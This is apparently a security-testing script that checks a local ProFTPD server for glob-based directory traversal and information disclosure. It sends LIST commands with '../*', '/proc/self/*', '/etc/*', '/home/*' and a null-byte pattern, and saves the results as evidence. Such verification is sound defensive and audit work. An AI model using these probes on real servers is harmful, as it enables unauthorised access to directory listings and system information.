#!/usr/bin/env python3
"""Verify LIST glob traversal and /proc disclosure"""
import socket, re, json, time
from datetime import datetime

HOST, PORT, USER, PASS = "127.0.0.1", 21, "ftptest", "ftptest123"
EVIDENCE_DIR = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/ProFTPD/evidence"

def ftp_list(pattern, timeout=8):
    ctrl = socket.socket(); ctrl.settimeout(10); ctrl.connect((HOST, PORT))
    ctrl.recv(1024)
    def cmd(c):
        ctrl.sendall((c+"\r\n").encode()); time.sleep(0.1)
        ctrl.settimeout(5)
        try: return ctrl.recv(4096).decode('utf-8','replace')
        except: return ""
    cmd(f"USER {USER}"); cmd(f"PASS {PASS}"); cmd("TYPE A")
    pasv = cmd("PASV")
    m = re.search(r'\((\d+),(\d+),(\d+),(\d+),(\d+),(\d+)\)', pasv)
    if not m: return ""
    h = '.'.join(m.group(i) for i in range(1,5))
    p = int(m.group(5))*256+int(m.group(6))
    ds = socket.socket(); ds.settimeout(timeout); ds.connect((h, p))
    ctrl.sendall(f"LIST {pattern}\r\n".encode())
    ctrl.settimeout(3)
    try: ctrl.recv(256)
    except: pass
    data = b""
    ds.settimeout(timeout)
    try:
        while True:
            c = ds.recv(4096)
            if not c: break
            data += c
    except: pass
    ds.close()
    try: ctrl.sendall(b"QUIT\r\n"); ctrl.close()
    except: pass
    return data.decode('utf-8','replace')

print("="*60)
print("ProFTPD Glob Traversal Verification")
print("="*60)

findings = {}

# 1. Test ../  from ftptest home (/home/ftptest)
print("\n[1] LIST ../* — listing parent of home dir")
data = ftp_list("../*")
lines = [l for l in data.strip().split('\n') if l.strip()]
print(f"    Got {len(lines)} entries:")
for l in lines[:10]: print(f"    {l}")
findings["parent_dir_glob"] = {
    "command": "LIST ../*",
    "entries_returned": len(lines),
    "sample": lines[:10],
    "notes": "Lists parent of user home dir — should be blocked by chroot in production"
}

# 2. Test /proc/self/* — absolute path glob
print("\n[2] LIST /proc/self/* — absolute proc path")
data = ftp_list("/proc/self/*")
lines = [l for l in data.strip().split('\n') if l.strip()]
print(f"    Got {len(lines)} entries:")
for l in lines[:15]: print(f"    {l}")
findings["proc_self_glob"] = {
    "command": "LIST /proc/self/*",
    "entries_returned": len(lines),
    "sample": lines[:20],
    "notes": "Absolute path glob returns /proc/self contents — process information disclosure"
}

# 3. Test null byte glob
print("\n[3] LIST *\\x00* — null byte in glob pattern")
data = ftp_list("*\x00*")
lines = [l for l in data.strip().split('\n') if l.strip()]
print(f"    Got {len(lines)} entries (same as normal listing?):")
for l in lines[:5]: print(f"    {l}")
findings["null_byte_glob"] = {
    "command": "LIST *\\x00*",
    "entries_returned": len(lines),
    "sample": lines[:5],
    "notes": "Null byte in glob is ignored/truncated — lists current dir"
}

# 4. Test /etc/* — can we list /etc?
print("\n[4] LIST /etc/* — absolute /etc path")
data = ftp_list("/etc/*")
lines = [l for l in data.strip().split('\n') if l.strip()]
print(f"    Got {len(lines)} entries:")
for l in lines[:10]: print(f"    {l}")
findings["etc_glob"] = {
    "command": "LIST /etc/*",
    "entries_returned": len(lines),
    "sample": lines[:10],
    "notes": "Attempt to list /etc via absolute path glob"
}

# 5. Test /home/*
print("\n[5] LIST /home/* — list all home dirs")
data = ftp_list("/home/*")
lines = [l for l in data.strip().split('\n') if l.strip()]
print(f"    Got {len(lines)} entries:")
for l in lines[:10]: print(f"    {l}")
findings["home_glob"] = {
    "command": "LIST /home/*",
    "entries_returned": len(lines),
    "sample": lines[:10],
}

# Save evidence
output = {
    "test": "glob_traversal_verification",
    "date": datetime.now().isoformat(),
    "findings": findings
}
with open(f"{EVIDENCE_DIR}/glob_traversal_verification.json", 'w') as f:
    json.dump(output, f, indent=2)
print(f"\n[*] Evidence saved")
